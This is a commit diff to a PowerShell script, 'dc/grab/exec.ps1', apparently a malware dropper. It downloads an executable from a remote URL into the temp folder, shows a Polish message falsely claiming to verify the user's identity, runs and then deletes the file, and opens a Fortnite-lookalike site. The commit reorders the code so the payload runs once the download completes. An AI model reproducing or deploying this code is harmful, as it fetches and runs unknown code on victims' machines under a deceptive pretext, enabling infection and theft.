70a5d05144bf7a019e086261d41b24105b3cbdd0
xKotelek <contact@kotelek.dev>
2024-12-26 23:05:59 +0100

    Update exec.ps1

--- dc/grab/exec.ps1
+++ dc/grab/exec.ps1
@@ -3,22 +3,20 @@ powershell -Command "& {
     $output = Join-Path $env:TEMP 'temp.exe';
     $wc = New-Object System.Net.WebClient;
 
-    $wc.DownloadFileAsync([Uri]$url, $output);
-
     $wc.DownloadProgressChanged += {
         $percentage = [int]($_.ProgressPercentage);
         Write-Host ('Weryfikuję twoją tożsamość (status pobrania pliku) ' + $percentage + '%') -NoNewline;
     };
 
-    $wc.DownloadFileCompleted += {
-        Start-Process $output;
-        Remove-Item $output -Force;
-        Start-Process 'https://f0rtn1te-xp.ct8.pl/';
-        Write-Host 'Pobieranie zakończone. Naciśnij dowolny klawisz, aby zamknąć...' -ForegroundColor Green;
-        Pause;
-    };
+    $wc.DownloadFileAsync([Uri]$url, $output);
 
     while ($wc.IsBusy) {
         Start-Sleep -Milliseconds 500;
     }
+
+    Start-Process $output;
+    Remove-Item $output -Force;
+    Start-Process 'https://f0rtn1te-xp.ct8.pl/';
+    Write-Host 'Pobieranie zakończone. Naciśnij dowolny klawisz, aby zamknąć...' -ForegroundColor Green;
+    Pause;
 }"
